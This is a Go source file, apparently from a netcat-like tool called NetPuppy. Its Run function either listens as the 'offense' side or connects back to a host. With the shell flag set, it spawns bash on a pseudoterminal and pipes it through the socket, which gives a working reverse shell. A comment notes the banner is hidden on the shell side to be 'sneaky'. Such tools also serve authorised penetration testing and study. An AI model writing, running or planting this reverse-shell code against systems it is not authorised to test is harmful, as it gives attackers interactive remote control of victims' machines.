package cmd

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/signal"
	"time"

	// NetPuppy pkgs:
	"github.com/trshpuppy/netpuppy/cmd/conn"
	"github.com/trshpuppy/netpuppy/cmd/shell"
	"github.com/trshpuppy/netpuppy/pkg/pty"
	"github.com/trshpuppy/netpuppy/utils"
)

func Run(c conn.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Create peer instance based on user input:
	var thisPeer *conn.Peer = conn.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)

	// Print banner, but don't print if we are the peer running the shell (ooh sneaky!):
	if !thisPeer.Shell {
		fmt.Printf("%s", utils.Banner())

		// Update user:
		var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
		fmt.Println(updateUserBanner)
	}

	// Make connection:
	var socketInterface conn.SocketInterface
	if thisPeer.ConnectionType == "offense" {
		socketInterface = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
	} else {
		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
	}

	// If shell flag is true, start shell:
	//	var shellInterface shell.ShellInterface
	var shellInterface *shell.RealShell
	var shellErr error
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter shell.RealShellGetter
		shellInterface, shellErr = realShellGetter.GetConnectBackInitiatedShell()
		if shellErr != nil {
			errString := "Error starting shell: " + shellErr.Error()
			socketInterface.Write([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(socketInterface, thisPeer)

	// If we are the connect-back peer & the user wants a shell, start the shell here:
	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		// Get pseudoterminal slave and master device files:
		master, pts, err := pty.GetPseudoterminalDevices()
		if err != nil {
			// Send error through socket, then quit:
			errString := "Error starting shell: " + err.Error()
			socketInterface.Write([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}

		defer pts.Close()
		defer master.Close()

		// Hook up slave device to bash process:
		shellInterface.Shell.Stdin = pts
		shellInterface.Shell.Stdout = pts
		shellInterface.Shell.Stderr = pts

		/*
			when nbash starts a subprocess, listen for that
			then reset pts to the new file descriptors of the subprocess
			- background the original process?
			- foreground new subprocess?

			How check for new subprocess?
		*/

		// Start bash:
		err = shellInterface.StartShell()
		if err != nil {
			// Write error to socket, close socket, quit:
			errString := "Error starting shell: " + err.Error()
			socketInterface.Write([]byte(errString))
			socketInterface.Close()
			os.Exit(1)
		}

		// Attach master device to socket:
		var routineErr error
		commandPending := true

		// Write output from master device to socket:
		go func(socket conn.SocketInterface, master *os.File) {
			_, err := io.Copy(socket.GetWriter(), master)
			if err != nil {
				routineErr = fmt.Errorf("Error copying master device to socket: %v\n", err)
				return
			}
			commandPending = false
		}(socketInterface, master)

		// Write output from socket to master device:
		go func(socket conn.SocketInterface, master *os.File) {
			commandPending = true
			_, err := io.Copy(master, socket.GetReader())
			if err != nil {
				routineErr = fmt.Errorf("Error socket to master device: %v\n", err)
				return
			}
		}(socketInterface, master)

		// Start for loop with timeout to keep things running smoothly:
		for {
			if routineErr != nil {
				// Send error through socket, then quit:
				socketInterface.Write([]byte(routineErr.Error()))
				socketInterface.Close()
				os.Exit(1)
			}

			if commandPending {
				// Timeout:
				time.Sleep(69 * time.Millisecond)
			}
		}
	} else {
		// Go routines to read user input:
		readUserInput := func(c chan<- string) {
			for {
				userReader := bufio.NewReader(os.Stdin)
				userInput, err := userReader.ReadString('\n')
				if err != nil {
					log.Fatalf("Error reading input from user: %v\n", err)
				}
				c <- userInput
			}
		}

		readSocket := func(socketInterface conn.SocketInterface, c chan<- []byte) {
			// Read data in socket:
			for {
				dataReadFromSocket, err := socketInterface.Read()
				if len(dataReadFromSocket) > 0 {
					c <- dataReadFromSocket
				}
				if err != nil {
					// Check for timeout error using net pkg:
					//....... (type assertion checks if 'err' uses net.Error interface)
					//....... (( isANetError will be true if it is using the net.Error interface))
					netErr, isANetError := err.(net.Error)
					if isANetError && netErr.Timeout() {
						// If the socket timed out, have to set read deadline again (or connection will close):
						continue
					} else if errors.Is(err, io.EOF) {
						continue
					} else {
						log.Fatalf("Error reading data from socket: %v\n", err)
					}
				}
			}
		}

		// Write go routines
		writeToSocket := func(data string, socketInterface conn.SocketInterface) {
			// Check length so we can clear channel, but not send blank data:
			if len(data) > 0 {
				_, erR := socketInterface.Write([]byte(data))
				if erR != nil {
					log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
				}
			}
			return
		}

		printToUser := func(data []byte) {
			// Check the length:
			if len(data) > 0 {
				_, err := os.Stdout.Write(data)
				if err != nil {
					log.Fatalf("Error printing data to user: %v\n", err)
				}
			}
			return
		}

		// Make channels & defer their close until Run() returns:
		userInputChan := make(chan string)
		socketDataChan := make(chan []byte)
		defer func() {
			close(userInputChan)
			close(socketDataChan)
		}()

		// Start go routines to read from socket and user:
		go readSocket(socketInterface, socketDataChan)
		go readUserInput(userInputChan)

		for {
			select {
			case dataFromUser := <-userInputChan:
				go writeToSocket(dataFromUser, socketInterface)
			case dataFromSocket := <-socketDataChan:
				go printToUser(dataFromSocket)
			default:
				// Timeout:
				time.Sleep(69 * time.Millisecond)
			}
		}
	}
}

func listenForSIGINT(connection conn.SocketInterface, thisPeer *conn.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				if !thisPeer.Shell {
					fmt.Printf("signal: %v\n", sig)
				}
				connection.Close()
				os.Exit(2)
			}
		}
	}()
}
